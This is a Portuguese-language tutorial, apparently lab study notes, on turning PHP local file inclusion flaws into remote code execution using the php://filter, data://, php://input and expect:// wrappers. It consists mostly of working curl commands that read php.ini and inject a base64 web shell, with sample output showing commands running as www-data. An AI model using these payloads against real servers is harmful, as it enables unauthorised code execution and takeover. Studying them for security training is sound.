# Wrappers PHP e Exploração de Vulnerabilidades LFI

### Verificação de Configurações PHP

Antes de usar wrappers PHP, verifique se `allow_url_include` está habilitado:
```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | base64 -d | grep allow_url_include
```

Execução Remota de Código com Wrappers
Wrapper data
Codifique um web shell em base64 e passe-o via URL:
```
echo '<?php system($_GET["cmd"]); ?>' | base64
Resultado: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
### Execute o comando codificado via URL:
```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
Resultado: uid=33(www-data) gid=33(www-data) groups=33(www-data)

### Wrapper input
Envie o web shell como dados POST e passe o comando como parâmetro GET:
```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
Resultado: uid=33(www-data) gid=33(www-data) groups=33(www-data)

### Wrapper expect
Verifique a disponibilidade do expect e use-o para executar comandos:
```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```
Resultado: extension=expect

### Execução
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```
Resultado: uid=33(www-data) gid=33(www-data) groups=33(www-data)

### Resumo
Os wrappers PHP data, input, e expect permitem a execução de código remoto via vulnerabilidades LFI, proporcionando diferentes métodos para obter controle sobre o servidor back-end. Verifique a configuração allow_url_include, pois muitos desses ataques dependem dessa configuração estar habilitada.
